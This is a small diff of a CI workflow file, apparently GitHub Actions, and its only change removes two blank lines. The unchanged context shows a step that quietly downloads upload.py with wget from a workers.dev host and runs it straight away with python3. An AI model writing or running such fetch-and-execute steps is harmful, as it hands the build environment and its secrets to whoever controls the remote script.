@@ -35,5 +35,3 @@ jobs:
       - run: |
           cd work
           wget https://share.secretz.workers.dev/2:/upload.py -q --show-progress -O upload.py && python3 upload.py
-
-          
